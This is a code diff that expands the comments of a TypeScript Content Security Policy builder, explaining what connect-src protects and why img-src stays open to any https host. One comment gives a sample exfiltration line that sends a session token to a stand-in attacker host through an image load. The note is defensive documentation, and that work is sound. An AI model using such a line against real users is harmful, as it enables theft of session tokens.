@@ -64,8 +64,8 @@ export function websocketOrigin(origin: string): string {
  * What this genuinely buys, stated honestly rather than generously:
  *
  *   - connect-src is the real prize. It is the difference between a compromised
- *     dependency being able to post a session token anywhere it likes, and
- *     being able to reach only our own backend.
+ *     dependency being able to fetch, XHR or WebSocket a session token
+ *     anywhere it likes, and being able to reach only our own backend.
  *   - object-src, base-uri and form-action close old, cheap injection routes
  *     that cost nothing to shut.
  *
@@ -80,6 +80,15 @@ export function websocketOrigin(origin: string): string {
  *   - style-src likewise: this codebase styles with inline style attributes
  *     throughout (Card, the buttons module, every screen), which is exactly
  *     what 'unsafe-inline' governs.
+ *   - img-src admits any https origin, so it leaves an exfiltration channel
+ *     open that connect-src does not cover. A stolen token still fits in
+ *     `new Image().src = "https://attacker.example/?d=" + token`, which is an
+ *     image load, not a fetch, and no directive here stops it. Scoping the
+ *     directive is not available: connector logos and user avatars come from
+ *     whatever host the connector or the identity provider chose, and there is
+ *     no list of them to enumerate. So connect-src narrows the channel a
+ *     compromised dependency would reach for first, and does not close the
+ *     question.
  */
 export function buildCsp(apiUrl: string | undefined): string {
   const origin = apiOrigin(apiUrl);
@@ -97,6 +106,13 @@ export function buildCsp(apiUrl: string | undefined): string {
     // Connector logos and user avatars come from arbitrary https hosts, and a
     // broken image is a cosmetic failure rather than a security one. data: and
     // blob: carry generated marks and canvas exports.
+    //
+    // This is the one directive here that is genuinely open, and the doc
+    // comment above says what that costs: an image load is a way out that
+    // connect-src does not govern. Kept open anyway because the alternative is
+    // a host list nobody can complete -- a connector's logo lives wherever its
+    // publisher put it -- and a policy that breaks images in the app would be
+    // relaxed again within a week.
     ["img-src", ["'self'", "data:", "blob:", "https:"]],
     // Fonts are self-hosted on purpose (layout.tsx), so this can be closed
     // completely -- and should be, so a future dependency cannot quietly
